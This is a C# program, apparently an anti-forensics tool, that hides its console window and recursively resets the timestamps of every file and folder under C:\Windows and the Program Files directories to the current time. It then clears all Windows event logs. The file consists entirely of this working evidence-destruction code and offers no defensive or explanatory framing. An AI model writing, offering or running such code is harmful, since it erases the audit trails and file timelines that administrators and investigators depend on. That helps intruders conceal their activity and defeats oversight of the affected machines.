using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Clean
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public Program()
        {
            DirSearch(@"C:\Windows");
            DirSearch(@"C:\Program Files");
            DirSearch(@"C:\Program Files (x86)");
            CleanAllLogs();
        }

        public void DirSearch(string dir)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    try
                    {
                        try
                        {
                            File.SetCreationTime(file, DateTime.Now);
                            File.SetLastAccessTime(file, DateTime.Now);
                            File.SetLastWriteTime(file, DateTime.Now);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        continue;
                    }
                }

                foreach (string d in Directory.GetDirectories(dir))
                {
                    Console.WriteLine(d);
                    DirSearch(d);
                    // Add more ?? 
                    Directory.SetCreationTime(d, DateTime.Now);
                    Directory.SetLastAccessTime(d, DateTime.Now);
                    Directory.SetLastWriteTime(d, DateTime.Now);
                }
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void CleanAllLogs()
        {
            try
            {
                foreach (var eventLog in EventLog.GetEventLogs())
                {
                    eventLog.Clear();
                    eventLog.Dispose();
                }
            }
            catch { }
        }

        static void Main(string[] args)
        {

            try
            {
                var handle = GetConsoleWindow();
                // Hide
                ShowWindow(handle, SW_HIDE);
                Program p = new Program();
                
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

    }
}
